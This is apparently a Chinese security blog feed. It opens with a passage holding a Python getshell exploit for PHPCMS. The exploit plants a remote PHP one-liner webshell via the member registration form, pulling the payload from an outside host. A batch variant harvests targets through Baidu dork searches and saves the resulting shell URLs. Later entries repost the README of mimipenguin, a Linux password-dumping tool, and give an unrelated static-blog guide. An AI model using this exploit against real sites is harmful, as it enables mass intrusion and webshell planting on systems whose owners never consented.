<a id="more"></a>
<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>依赖库的安装<code>pip install requests</code></p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="string">'''</span></div><div class="line">----------------------</div><div class="line">Author : Akkuman</div><div class="line">Blog   : hacktech.cn</div><div class="line">----------------------</div><div class="line">'''</div><div class="line"></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</div><div class="line"></div><div class="line">chars = <span class="string">'qwertyuiopasdfghjklzxcvbnm0123456789'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</div><div class="line">        print(<span class="string">"[*]Usage   : Python 1.py http://xxx.com"</span>)</div><div class="line">        sys.exit()</div><div class="line">    host = sys.argv[<span class="number">1</span>]</div><div class="line">    url = host + <span class="string">"/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1"</span></div><div class="line"></div><div class="line">    data = &#123;</div><div class="line">        <span class="string">"siteid"</span>: <span class="string">"1"</span>,</div><div class="line">        <span class="string">"modelid"</span>: <span class="string">"1"</span>,</div><div class="line">        <span class="string">"username"</span>: <span class="string">"dsakkfaffdssdudi"</span>,</div><div class="line">        <span class="string">"password"</span>: <span class="string">"123456"</span>,</div><div class="line">        <span class="string">"email"</span>: <span class="string">"dsakkfddsjdi@qq.com"</span>,</div><div class="line">        <span class="comment"># 如果想使用回调的可以使用http://file.codecat.one/oneword.txt，一句话地址为.php后面加上e=YXNzZXJ0</span></div><div class="line">        <span class="string">"info[content]"</span>: <span class="string">"&lt;img src=http://file.codecat.one/normalOneWord.txt?.php#.jpg&gt;"</span>,</div><div class="line">        <span class="string">"dosubmit"</span>: <span class="string">"1"</span>,</div><div class="line">        <span class="string">"protocol"</span>: <span class="string">""</span>,</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        rand_name = chars[Random().randint(<span class="number">0</span>, len(chars) - <span class="number">1</span>)]</div><div class="line">        data[<span class="string">"username"</span>] = <span class="string">"akkuman_%s"</span> % rand_name</div><div class="line">        data[<span class="string">"email"</span>] = <span class="string">"akkuman_%s@qq.com"</span> % rand_name</div><div class="line">        </div><div class="line">        htmlContent = requests.post(url, data=data)</div><div class="line"></div><div class="line">        successUrl = <span class="string">""</span></div><div class="line">        <span class="keyword">if</span> <span class="string">"MySQL Error"</span> <span class="keyword">in</span> htmlContent.text <span class="keyword">and</span> <span class="string">"http"</span> <span class="keyword">in</span> htmlContent.text:</div><div class="line">            successUrl = htmlContent.text[htmlContent.text.index(<span class="string">"http"</span>):htmlContent.text.index(<span class="string">".php"</span>)] + <span class="string">".php"</span></div><div class="line">            print(<span class="string">"[*]Shell  : %s"</span> % successUrl)</div><div class="line">        <span class="keyword">if</span> successUrl == <span class="string">""</span>:</div><div class="line">            print(<span class="string">"[x]Failed : had crawled all possible url, but i can't find out it. So it's failed.\n"</span>)</div><div class="line"></div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        print(<span class="string">"Request Error"</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>
<h2 id="批量"><a href="#批量" class="headerlink" title="批量"></a>批量</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="string">'''</span></div><div class="line">----------------------</div><div class="line">Author : Akkuman</div><div class="line">Blog   : hacktech.cn</div><div class="line">----------------------</div><div class="line">'''</div><div class="line"></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</div><div class="line"><span class="comment"># from urlparse import unquote //Python2</span></div><div class="line"><span class="comment"># from urlparse import urlparse //Python2</span></div><div class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</div><div class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</div><div class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</div><div class="line"></div><div class="line">chars = <span class="string">'qwertyuiopasdfghjklzxcvbnm0123456789'</span></div><div class="line"></div><div class="line">headers = &#123;</div><div class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0"</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">parseBaidu</span><span class="params">(keyword, pagenum)</span>:</span></div><div class="line">    keywordsBaseURL = <span class="string">'https://www.baidu.com/s?wd='</span> + str(quote(keyword)) + <span class="string">'&amp;oq='</span> + str(quote(keyword)) + <span class="string">'&amp;ie=utf-8'</span> + <span class="string">'&amp;pn='</span></div><div class="line">    pnum = <span class="number">0</span></div><div class="line">    <span class="keyword">while</span> pnum &lt;= int(pagenum):</div><div class="line">        baseURL = keywordsBaseURL + str(pnum*<span class="number">10</span>)</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            request = requests.get(baseURL, headers=headers)</div><div class="line">            soup = BeautifulSoup(request.text, <span class="string">"html.parser"</span>)</div><div class="line">            <span class="keyword">for</span> a <span class="keyword">in</span> soup.select(<span class="string">'div.c-container &gt; h3 &gt; a'</span>):</div><div class="line">                url = requests.get(a[<span class="string">'href'</span>], headers=headers).url</div><div class="line">                <span class="keyword">yield</span> url</div><div class="line">        <span class="keyword">except</span>:</div><div class="line">            <span class="keyword">yield</span> <span class="keyword">None</span></div><div class="line">        <span class="keyword">finally</span>:</div><div class="line">            pnum += <span class="number">1</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">saveShell</span><span class="params">(shellUrl)</span>:</span></div><div class="line">    <span class="keyword">with</span> open(<span class="string">"webShell.txt"</span>,<span class="string">"a+"</span>) <span class="keyword">as</span> f:</div><div class="line">        f.write(<span class="string">"[*]%s\n"</span> % shellUrl)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    data = &#123;</div><div class="line">        <span class="string">"siteid"</span>: <span class="string">"1"</span>,</div><div class="line">        <span class="string">"modelid"</span>: <span class="string">"1"</span>,</div><div class="line">        <span class="string">"username"</span>: <span class="string">"akkumandsad"</span>,</div><div class="line">        <span class="string">"password"</span>: <span class="string">"123456"</span>,</div><div class="line">        <span class="string">"email"</span>: <span class="string">"akkakkumafa@qq.com"</span>,</div><div class="line">        <span class="comment"># 如果想使用回调的可以使用http://file.codecat.one/oneword.txt，一句话地址为.php后面加上e=YXNzZXJ0,普通一句话http://file.codecat.one/normalOneWord.txt</span></div><div class="line">        <span class="string">"info[content]"</span>: <span class="string">"&lt;img src=http://7xusrl.com1.z0.glb.clouddn.com/bypassdog.txt?.php#.jpg&gt;"</span>,</div><div class="line">        <span class="string">"dosubmit"</span>: <span class="string">"1"</span>,</div><div class="line">        <span class="string">"protocol"</span>: <span class="string">""</span>,</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> crawlUrl <span class="keyword">in</span> parseBaidu(<span class="string">"inurl:index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1"</span>, <span class="number">10</span>):</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            <span class="keyword">if</span> crawlUrl:</div><div class="line">                rand_name = chars[Random().randint(<span class="number">0</span>, len(chars) - <span class="number">1</span>)]</div><div class="line">                data[<span class="string">"username"</span>] = <span class="string">"akkuman_%s"</span> % rand_name</div><div class="line">                data[<span class="string">"email"</span>] = <span class="string">"akkuman_%s@qq.com"</span> % rand_name</div><div class="line">                host = urlparse(crawlUrl).scheme + <span class="string">"://"</span> + urlparse(crawlUrl).hostname</div><div class="line">                url = host + <span class="string">"/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1"</span></div><div class="line">                htmlContent = requests.post(url, data=data, timeout=<span class="number">10</span>)</div><div class="line">                successUrl = <span class="string">""</span></div><div class="line">                <span class="keyword">if</span> <span class="string">"MySQL Error"</span> <span class="keyword">in</span> htmlContent.text <span class="keyword">and</span> <span class="string">"http"</span> <span class="keyword">in</span> htmlContent.text:</div><div class="line">                    successUrl = htmlContent.text[htmlContent.text.index(<span class="string">"http"</span>):htmlContent.text.index(<span class="string">".php"</span>)] + <span class="string">".php"</span></div><div class="line">                    print(<span class="string">"[*]Shell  : %s"</span> % successUrl)</div><div class="line">                    saveShell(successUrl)</div><div class="line">                <span class="keyword">if</span> successUrl == <span class="string">""</span>:</div><div class="line">                    print(<span class="string">"[x]Failed : Failed to getshell."</span>)</div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                <span class="keyword">continue</span></div><div class="line">        <span class="keyword">except</span>:</div><div class="line">            print(<span class="string">"Request Error"</span>)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>
<h2 id="测试图"><a href="#测试图" class="headerlink" title="测试图"></a>测试图</h2><h3 id="单个"><a href="#单个" class="headerlink" title="单个"></a>单个</h3><p><img src="https://ooo.0o0.ooo/2017/04/10/58eb6a69d5676.png" alt="TIM图片20170410191951.png"></p>
<h3 id="批量-1"><a href="#批量-1" class="headerlink" title="批量"></a>批量</h3><p><img src="https://ooo.0o0.ooo/2017/04/11/58ec642d6578f.png" alt="TIM图片20170410225257.png"></p>
<h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p><a href="http://file.codecat.one/phpcms/" target="_blank" rel="external">代码下载地址</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;一键化&lt;code&gt;python 1.py http://xxx.com&lt;/code&gt;,如果是批量直接运行py文件即可&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;待办&quot;&gt;&lt;a href=&quot;#待办&quot; class=&quot;headerlink&quot; title=&quot;待办&quot;&gt;&lt;/a&gt;待办&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;[] 加入对有验证码phpcms网站的支持&lt;/li&gt;
&lt;li&gt;[] 加入批量(&lt;strong&gt;已完成&lt;/strong&gt;)&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="Tools" scheme="http://akkuman.coding.me/categories/Tools/"/>
    
    
      <category term="Tools" scheme="http://akkuman.coding.me/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>抓取当前登录用户登录密码的工具：mimipenguin</title>
    <link href="http://akkuman.coding.me/2017/04/02/mimipenguin.html"/>
    <id>http://akkuman.coding.me/2017/04/02/mimipenguin.html</id>
    <published>2017-04-02T02:03:29.000Z</published>
    <updated>2017-04-06T03:25:08.672Z</updated>
    
    <content type="html"><![CDATA[<p><strong><a href="https://github.com/huntergregal/mimipenguin" target="_blank" rel="external">Github项目地址</a></strong></p>
<p>前有Mimikatz，今有mimipenguin，近日国外安全研究员huntergregal发布了工具mimipenguin，一款Linux下的密码抓取神器，可以说弥补了Linux下密码抓取的空缺。<br>编写思路来自流行的<a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="external">windows密码抓取神器mimikatz</a><br><a id="more"></a><br><img src="https://ooo.0o0.ooo/2017/04/06/58e5a6e8ac47f.png" alt=""></p>
<h2 id="详情"><a href="#详情" class="headerlink" title="详情"></a>详情</h2><p>通过转储过程和提取那些包含明文密码可能性很高的行（hang），充分利用内存中的明文凭证。通过检查/etc/shadow文件hash,内存中的hash和正则匹配去尝试计算出每个单词的概率</p>
<h2 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h2><ul>
<li>root权限</li>
</ul>
<h2 id="已支持-以下环境已通过测试"><a href="#已支持-以下环境已通过测试" class="headerlink" title="已支持(以下环境已通过测试)"></a>已支持(以下环境已通过测试)</h2><ul>
<li>Kali 4.3.0 (rolling) x64 (gdm3)</li>
<li>Ubuntu Desktop 12.04 LTS x64 (Gnome Keyring 3.18.3-0ubuntu2)</li>
<li>Ubuntu Desktop 16.04 LTS x64 (Gnome Keyring 3.18.3-0ubuntu2)</li>
<li>XUbuntu Desktop 16.04 x64 (Gnome Keyring 3.18.3-0ubuntu2)</li>
<li>VSFTPd 3.0.3-8+b1 (Active FTP client connections)</li>
<li>Apache2 2.4.25-3 (Active/Old HTTP BASIC AUTH Sessions) [Gcore dependency]</li>
<li>openssh-server 1:7.3p1-1 (Active SSH connections - sudo usage)</li>
</ul>
<h2 id="记录"><a href="#记录" class="headerlink" title="记录"></a>记录</h2><ul>
<li>在内存中的密码 - 100%有效</li>
<li>计划扩大支持和其他凭证位置</li>
<li>努力扩展到非桌面环境</li>
<li>已知bug - 有时gcore会挂起脚本，不过这是gcore导致的问题</li>
<li>开放提出请求和社区研究</li>
<li>计划未来的LDAP研究（nscld winbind等）</li>
</ul>
<h2 id="联系方式"><a href="#联系方式" class="headerlink" title="联系方式"></a>联系方式</h2><ul>
<li>Twitter: <a href="https://twitter.com/HunterGregal" target="_blank" rel="external">@huntergregal</a></li>
<li>个人站点: <a href="http://huntergregal.com/" target="_blank" rel="external">huntergregal.com</a></li>
<li>Github: <a href="https://github.com/huntergregal" target="_blank" rel="external">huntergregal</a></li>
</ul>
<h2 id="特别鸣谢"><a href="#特别鸣谢" class="headerlink" title="特别鸣谢"></a>特别鸣谢</h2><ul>
<li>the-useless-one for remove Gcore as a dependency, cleaning up tabs, and adding output option</li>
<li>gentilkiki for Mimikatz, the inspiration and the twitter shoutout</li>
<li>pugilist for cleaning up PID extraction and testing</li>
<li>ianmiell for cleaning up some of my messy code</li>
<li>w0rm for identifying printf error when special chars are involved</li>
<li>benichmt1 for identifying multiple authenticate users issue</li>
<li>ChaitanyaHaritash for identifying special char edge case issues</li>
</ul>
<p>转载自<a href="https://github.com/huntergregal/mimipenguin/blob/master/README.md" target="_blank" rel="external">mimipenguin</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://github.com/huntergregal/mimipenguin&quot;&gt;Github项目地址&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;前有Mimikatz，今有mimipenguin，近日国外安全研究员huntergregal发布了工具mimipenguin，一款Linux下的密码抓取神器，可以说弥补了Linux下密码抓取的空缺。&lt;br&gt;编写思路来自流行的&lt;a href=&quot;https://github.com/gentilkiwi/mimikatz&quot;&gt;windows密码抓取神器mimikatz&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Tools" scheme="http://akkuman.coding.me/categories/Tools/"/>
    
    
      <category term="Tools" scheme="http://akkuman.coding.me/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>推荐一个静态博客兼笔记的工具：WDTP</title>
    <link href="http://akkuman.coding.me/2017/04/01/Walden-Tips-Introdution.html"/>
    <id>http://akkuman.coding.me/2017/04/01/Walden-Tips-Introdution.html</id>
    <published>2017-04-01T12:27:51.000Z</published>
    <updated>2017-04-01T12:37:12.404Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>WDTP（山湖录）不止是一款开源免费的GUI桌面单机版静态网站生成器和简单方便的前端开发工具，更是一款跨平台的集笔记、录音、个人知识管理、写作/创作、博客/网站内容与样式管理等功能于一体的多合一内容处理/管理器，同时还是一款高度追求用户体验的Markdown文本编辑器和一款方便强大的录音机。本软件研发的核心思想是：<strong>简洁高效、轻灵优雅、先进强悍、操作简单</strong>。</p>
<a id="more"></a>
<p><img src="http://underwaysoft.com/works/wdtp/media/wdtp-main.jpg" alt=""></p>
<p>WDTP（山湖录）可运行于macOS和Windows系统下，旨在提高这两大平台下所有写作/分享者的生产力及生产效率，节约耗时，减少无谓的智能、体力与资源消耗。它适合于以下群体：</p>
<ul>
<li>以<strong>文字、声音、图片、视频为主要内容</strong>的写作/记录/创作/分享者</li>
<li>职业或业余作家、小说家、编剧、技术类图书的作者及编撰者</li>
<li>经常记笔记或写点东西的人</li>
<li>写作极客</li>
<li>打算采用静态页面的个人博客</li>
<li>打算采用静态页面的中小企业<br>WDTP的全名是：<strong>Walden Tips</strong>，中文名称：<strong>山湖录</strong>，UnderwaySoft开发出品。设计、编程及维护：SwingCoder。立项日期：2016年8月2日，第一个内测版发布日期：2017年2月3日。</li>
</ul>
<h2 id="核心功能"><a href="#核心功能" class="headerlink" title="核心功能"></a>核心功能</h2><ul>
<li>创作。对职业作家（特别是技术作家以及需要大量构思与情节编排的文艺作家）来说比Pages、Word等WYSWYG类型的桌面文字软件更加高效、简洁和灵活的内容创作、章节管理与格式化排版工具。可方便地实现多章节（情节、场景、概念、故事主线等）并发创作/编辑、任意调序、随意归类等强大功能，完稿后一键即可成书。</li>
<li>笔记。可随时记录并管理学习笔记、读书笔记以及有一定篇幅并打算结构化保存、管理、检视和封装的零星随记、杂感等等。可定期将所有或任意分类（目录）下的笔记“装订成册”、集中输出，一键即可完成。</li>
<li>建站。强大而新颖的静态网站维护、编辑、生成、代码调试与内容、结构管理系统。特别适合追求全站真正静态化、内容至上的个人博客与中小企业官网。</li>
<li>Markdown编辑器。在保留并规范了大部分“正统”Markdown语法的基础上，WDTP根据大多数作者/作家的实际需求，增加了一批非常实用的新文本标记语法。比如：插入图注和表注、居中、靠右、多种类型的表格、图文混排、插入音视频媒体文件、内容注释、跨文档扩展标记等等。该编辑器针对Windows系统和macOS系统（非Retina显示屏）对中文字体的渲染结果不尽人意等情况专门做了特殊优化与调整，使用户在输入、编辑时可获得更良好的体验。</li>
<li>以上几项，不仅可以文字输入，更可以语音输入，直接记录声音。这一点对不擅长文字表达的朋友或者记者、演员、各类主持人、音乐家、演奏家等群体来说非常方便。</li>
<li>WDTP还有极具实用价值的“复习/提醒”功能，文档隐身功能，文档缩略语功能和极其强悍的“智库”架构。<br>其他更多……</li>
</ul>
<p>在“笔记、写书、建站/博客、前端开发”这几个方面，WDTP（山湖录）无缝集成，一键切换。即：同一套内容，随时可生成上述任何一种类型，还可多种类型混合使用。</p>
<p><strong>程序采用c++语言编写，作者同时也是我十分敬重的一位程序员，如果想查看更多信息请访问他的<a href="http://underwaysoft.com/works/wdtp/index.html" target="_blank" rel="external">项目主页</a>程序开源<a href="https://github.com/LegendRhine/WDTP" target="_blank" rel="external">github地址</a></strong></p>
<h2 id="上手使用"><a href="#上手使用" class="headerlink" title="上手使用"></a>上手使用</h2><p>本来想说更多的，但是确实这款软件和其他的静态博客生成器不一样，拥有着方便的界面，支持english和中文，设置里面即可切换，相信只要你使用过，你就会使用它，能感受到他的方便快捷，如果想看更多玩法和说明请查看<a href="http://underwaysoft.com/works/wdtp/index.html" target="_blank" rel="external">项目主页</a>，现在只支持两种模板book(用来作为笔记)和blog(用来生成静态博客)，不过作者说会逐渐增加主题，真的除了暂时主题匮乏之外(会前端的可以自己改改主题)，其他的功能相比于其他的静态博客生成器方便得不是一丁半点</p>
<p><strong>那么生成静态文件之后如何上传到自己的vps或者github pages或者coding pages呢？</strong></p>
<h3 id="上传到vps"><a href="#上传到vps" class="headerlink" title="上传到vps"></a>上传到vps</h3><p>这个你可以使用常规的FTP或者Rsync或者其他方法上传，不过我推荐自己的做法(使用Resilio Sync)<br>如果你的服务器是windows那么你只需要去<a href="https://www.resilio.com/individuals/" target="_blank" rel="external">Resilio Sync官网</a>下载，建议安装为服务，然后访问本机sync服务的网址，点击右上角添加文件夹添加你的网站根目录，然后复制读写key，本机安装Resilio sync客户端然后手动连接这个key到你的静态文件目录，具体可以查资料，这个不难<br>如果你的服务器是Linux，可以查看Resilio Sync网站上面的<a href="https://help.getsync.com/hc/en-us/articles/206178924" target="_blank" rel="external">How to install Sync Package on Linux</a>，说明比较详细，安装好之后和上面的步骤一样，然后只要你本机挂着resilio sync软件，生成就可以即时同步。<br>trust me， 你将找到这个软件(Resilio Sync)更多的玩法，这软件之前的名字是btsync<br>当然，这只是我自己使用的方法，你也可以使用其他方法<br>至于上传到github pages或者coding pages，这个你需要会用git，进入静态文件目录，然后bash下执行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">git init</div><div class="line">git add .</div><div class="line">git commit //命令给文件一个仓库标记，做为仓库历史，便于以后在远程端查找</div><div class="line">git remote add origin git@github.com:username/username.github.io.git</div></pre></td></tr></table></figure></p>
<p>git@github.com:username/username.github.io.git的是你的git远端地址，至于为什么用这个是因为ssh创建公钥之后不用重复输入密码<br><strong>注: </strong><a href="https://coding.net/help/doc/account/ssh-key.html" target="_blank" rel="external">如何生成ssh公钥</a>这篇文章是以coding.net为例，不过你生成的id_rsa.pub内容同时也可以添加到github，基本相同的步骤，如果有什么疑问可以百度一下关键词为<code>github ssh公钥 配置</code></p>
<h3 id="添加评论功能"><a href="#添加评论功能" class="headerlink" title="添加评论功能"></a>添加评论功能</h3><ul>
<li>如果你不愿意麻烦可以使用邮箱来收集评论<br>打开qq邮箱点击上方<strong>设置-&gt;账户-&gt;邮我-&gt;使用邮我</strong><br>然后获取代码<br><img src="https://ooo.0o0.ooo/2017/04/01/58df97595ea80.png" alt="snipaste_20170401_200420.png"><br>复制<code>&lt;a target=&quot;_blank&quot; href=&quot;http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&amp;email=64qAgJ6GioWYq5qaxYiEhg&quot; style=&quot;text-decoration:none;&quot;&gt;</code><br>然后打开你的项目文件夹/themes/blog/article.html，把相应的地方改为下面例子这样<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">page_navi</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">target</span>=<span class="string">"_blank"</span> <span class="attr">href</span>=<span class="string">"http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&amp;email=64qAgJ6GioWYq5qaxYiEhg"</span> <span class="attr">style</span>=<span class="string">"text-decoration:none;"</span>&gt;</span>评论/咨询/讨论/留言<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure>
</li>
</ul>
<p>然后别人点击评论就可以打开给你发邮件的入口</p>
<ul>
<li>如果你想添加社会化评论系统<br>鉴于多说即将关闭，国内没被墙的无需北岸的第三方评论已经很少了，这里我用<a href="https://livere.com" target="_blank" rel="external">来必力</a>做例子</li>
</ul>
<ol>
<li>注册登录(如果chrome浏览器注册之后一直登录不了请使用火狐)</li>
<li>点击顶栏安装，然后填好相关信息获取代码<br><img src="https://ooo.0o0.ooo/2017/04/01/58df9a0fc3eb5.png" alt="snipaste_20170401_201601.png"></li>
<li><p>然后打开你的项目文件夹/themes/blog/article.html，把原先的评论代码删除掉，在合适的地方插入上方代码，我插入完之后的article.html例子如下</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!doctype html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></div><div class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"Generator"</span> <span class="attr">content</span>=<span class="string">"WDTP by UnderwaySoft"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"Author"</span> <span class="attr">content</span>=<span class="string">"&#123;&#123;author&#125;&#125;"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"Keywords"</span> <span class="attr">content</span>=<span class="string">"&#123;&#123;keywords&#125;&#125;"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"Description"</span> <span class="attr">content</span>=<span class="string">"&#123;&#123;description&#125;&#125;"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"&#123;&#123;siteRelativeRootPath&#125;&#125;add-in/style.css"</span>/&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;&#123;title&#125;&#125;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span> </div><div class="line">  &#123;&#123;siteLogo&#125;&#125;</div><div class="line">  &#123;&#123;siteMenu&#125;&#125;</div><div class="line">  <span class="tag">&lt;<span class="name">hr</span>&gt;</span></div><div class="line">  &#123;&#123;siteNavi&#125;&#125;</div><div class="line">  &#123;&#123;content&#125;&#125;</div><div class="line">  <span class="tag">&lt;<span class="name">hr</span>&gt;</span></div><div class="line">  &#123;&#123;createAndModifyTime&#125;&#125;</div><div class="line"></div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span><span class="tag">&lt;<span class="name">h5</span>&gt;</span><span 